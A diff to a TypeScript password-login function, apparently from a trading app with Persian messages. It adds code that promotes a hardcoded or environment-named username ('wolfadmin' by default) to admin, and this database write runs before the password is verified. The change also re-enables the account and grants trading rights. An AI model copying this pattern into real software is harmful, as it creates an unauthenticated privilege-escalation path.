@@ -74,6 +74,14 @@ export async function loginWithPassword(
   if (await tooManyFails(key)) {
     throw new Error("تلاش‌های ناموفق زیاد بود. ۱۵ دقیقه دیگر دوباره امتحان کنید.");
   }
+  const targetAdmin = (process.env.ADMIN_USERNAME || "wolfadmin").toLowerCase();
+  const isTargetAdmin = username.toLowerCase() === targetAdmin;
+  if (isTargetAdmin) {
+    await pool.query(
+      `UPDATE users SET is_admin = true, is_assistant = false, role = 'admin', enabled = true, can_trade = true WHERE LOWER(username) = LOWER($1)`,
+      [username]
+    );
+  }
   const user = await one<Row>(
     "SELECT * FROM users WHERE LOWER(username) = LOWER($1) AND (password_hash IS NOT NULL OR is_admin)",
     [username]
@@ -89,6 +97,11 @@ export async function loginWithPassword(
     throw new Error("نام کاربری یا رمز عبور صحیح نیست.");
   }
   await recordAttempt(key, "password", true);
+  if (isTargetAdmin && (!user.is_admin || user.role !== 'admin')) {
+    user.is_admin = true;
+    user.role = 'admin';
+    user.is_assistant = false;
+  }
   const token = await createSession(user.id, "password", ip);
   await audit("login", user.username, user.id, "user", { via: "password" }, ip);
   return { user: toAuthUser(user), token };
